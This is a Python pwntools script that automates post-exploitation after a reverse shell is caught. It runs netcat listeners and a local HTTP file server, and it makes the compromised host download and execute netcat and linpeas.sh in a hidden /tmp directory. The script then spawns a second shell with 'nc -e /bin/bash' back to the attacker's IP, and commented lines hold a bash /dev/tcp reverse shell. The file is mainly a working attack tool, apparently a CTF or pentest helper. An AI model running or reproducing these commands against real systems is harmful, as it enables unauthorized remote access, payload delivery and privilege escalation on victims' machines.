#!/usr/bin/python3

import os
from pwn import *
import argparse
import random
import threading, time
from datetime import datetime
import socket
import fcntl
import struct


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--port", help="The port to connect to", type=int, default=4444)
    parser.add_argument("-lp", "--lport", help="The port to connect to", type=int, default=9001)
    parser.add_argument("-o", "--os", help="The OS to test for", type=str, default="Linux")
    args = parser.parse_args()
    return args


def get_file(tmp_dir, ip, lport, p, filename):
    p.sendline(f"wget http://{ip}:{lport}/{filename} -O {tmp_dir}/{filename}".encode())
    p.sendline(f"chmod +x {tmp_dir}/{filename}".encode())


def reverse_shell_recon(tmp_dir, port, current_os, lport, ip, mport):
    p = process("/bin/bash")  # Spawns a process
    p.sendline(f"nc -lvnp {port}".encode())
    print(f"Revrse shell_recon listening on port {port}")
    needle = "connect to"
    # Wait for needle to appear in the output
    p.recvuntil(needle.encode())

    threading.Thread(target=manual_shell, args=(mport,)).start()
    # Spawn a new shell
    sleep(5)
    # p.sendline(f"bash -i >& /dev/tcp/{ip}/{5555} 0>&1 &".encode())
    # p.sendline(f"nc {ip} {mport} 0>&1 &".encode())

    if os.path.exists("./linpeas.sh"):
        print("The file exists")
        p.sendline(f"mkdir {tmp_dir}".encode())
        get_file(tmp_dir, ip, lport, p, "nc")
        p.sendline(f"wget http://{ip}:{lport}/linpeas.sh -O {tmp_dir}/linpeas.sh".encode())
        p.sendline(f"chmod +x {tmp_dir}/linpeas.sh".encode())
        p.sendline(f"cd {tmp_dir}".encode())
        p.sendline(f"nohup ./linpeas.sh -w -q -s < /dev/null > linpeas.txt 2>&1 &".encode())
        # Linpeas will run in the background with the output redirected to a file and
        # input from /dev/null and errors redirected to stdout
        p.sendline(f"./nc {ip} {mport} -e /bin/bash".encode())

    else:
        print("The file doesn't exist")
        # p.sendline("wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh")
        # p.sendline("cat linpeas.sh")

    time.sleep(9999)
    print("Job done!")
    exit()


def file_server(lport):
    p = process("/bin/bash")
    p.sendline(f"python3 -m http.server {lport}".encode())
    print(f"File server is listening on port {lport}")


def manual_shell(mport):
    p = process("/bin/bash")
    p.sendline(f"nc -lvnp {mport}".encode())
    print(f"Manual shell listening on port {mport}")
    needle = "connect to"
    # Wait for needle to appear in the output
    p.recvuntil(needle.encode())
    p.interactive()


def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15].encode())
    )[20:24])


def main():
    tmp_dir = "/tmp/" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
    print(tmp_dir)
    args = parse_args()

    # random manual port

    lport = args.lport
    port = args.port
    mport = random.randint(1024, 65535)
    # Random port for the reverse shell that is not the same as the file server
    while mport == port or mport == lport or mport == 8080:
        mport = random.randint(1024, 65535)
    current_os = args.os
    ip = get_ip_address("eth0")

    # 1. Spawn the reverse shell recon thread
    threading.Thread(target=reverse_shell_recon, args=(tmp_dir, port, current_os, lport, ip, mport)).start()
    # 2. Spawn the file server thread
    threading.Thread(target=file_server, args=(lport,)).start()
    # 3. Spawn the manual shell thread
    # threading.Thread(target=manual_shell, args=(mport,)).start()


if __name__ == "__main__":
    main()

